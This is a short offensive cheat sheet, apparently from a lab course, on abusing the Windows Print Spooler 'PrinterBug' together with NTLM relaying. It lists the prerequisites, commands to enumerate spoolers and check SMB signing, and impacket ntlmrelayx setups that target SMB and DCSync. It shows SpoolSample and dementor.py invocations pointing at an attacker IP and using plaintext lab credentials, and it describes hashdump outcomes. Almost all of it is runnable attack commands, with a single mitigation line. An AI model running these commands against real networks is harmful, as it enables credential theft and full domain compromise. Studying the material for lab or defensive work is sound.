## Requirements:

### 1) Machine account administrative privileges

### 2) Valid set of AD account credentials

### 3) Network connectivity to the target's SMB service

### 4) The target host must be running print spooler service

### 5) The hosts must not have SMB signing enforced

## Commands:

#### 1) GWMI Win32_Printer -Computer COMPUTER_NAME 

#### OR: Get-PrinterPort -ComputerName COMPUTER_NAME

## SMB Signing verification

#### nmap --script=smb2-security-mode -p 445 DOMAIN DOMAIN2

### If SMB is not enforced, then it is exploitable.

#### 1) python3 Impacket-ntlmrelayx.py -smb2support -t smb://SERVER_IP -debug (Set up NTLM Relay)

#### 2) On a compromised machine: SpoolSample.exe SERVER DOMAIN "ATTACK_IP"

#### 3) Perform a hashdump if no command is specified (SpoolSample Exploit)

## THIS ATTACK CAN BE UNSTABLE SO USE IT WITH CAUTION!

# Print Spooler & NTLM Relaying

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support`   | Used to forward any connections to DC2 and attempt to perform DCsync attack |
| `python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123` | Used to trigger the PrinterBug |
| `RegisterSpoolerRemoteRpcEndPoint`                           | Registry key that can be disabled to prevent the PrinterBug |

